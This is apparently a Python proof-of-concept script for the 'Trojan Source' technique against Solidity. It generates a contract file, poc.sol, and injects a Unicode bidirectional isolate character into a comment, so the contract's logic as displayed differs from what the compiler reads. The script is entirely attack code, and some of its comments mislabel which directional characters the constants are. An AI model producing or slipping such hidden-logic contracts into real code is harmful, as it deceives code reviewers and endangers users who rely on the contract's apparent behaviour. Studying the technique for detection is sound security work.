import os
import time

solc_compilers = ["solc", "solcjs"]
solc_args = ["", " --bin "]


LRI=chr(0x202D) #left to right override
RLO=chr(0x202E) #right to left override
LRI_i=chr(0x2066) #left to right isolate
RLO_i=chr(0x2067) #left to right isolate
PDI=chr(0x2069) #pop directional isolate

sc_sep = "@<##>@"
sc_path = "poc.sol"
sc_ver = "pragma solidity ^0.8.17;\n"
sc_body = """
contract Example{
  address owner;
  uint256 x;

  constructor() {
    owner = msg.sender;
  }

  function func(uint256 _x) public returns(uint256) {
    require(msg.sender == owner);
    x = _x + 2;
    /* 
        // comment @<##>@
        x = 42;/*
    */
    return x;
  }
}
"""

def compile_sol(solc_select=0):
  solc_tmp = solc_compilers[solc_select] + solc_args[solc_select]
  os.system("{} {}".format(solc_tmp, sc_path))


sc_body_list = sc_body.split(sc_sep)
sc_head = sc_body_list[0]
sc_body = sc_body_list[1]

x_c = RLO_i + " */ "
with open(sc_path, "w") as fp :
  fp.write( sc_ver + sc_head + x_c + sc_body )

#compile_sol()
print("[+] Done")

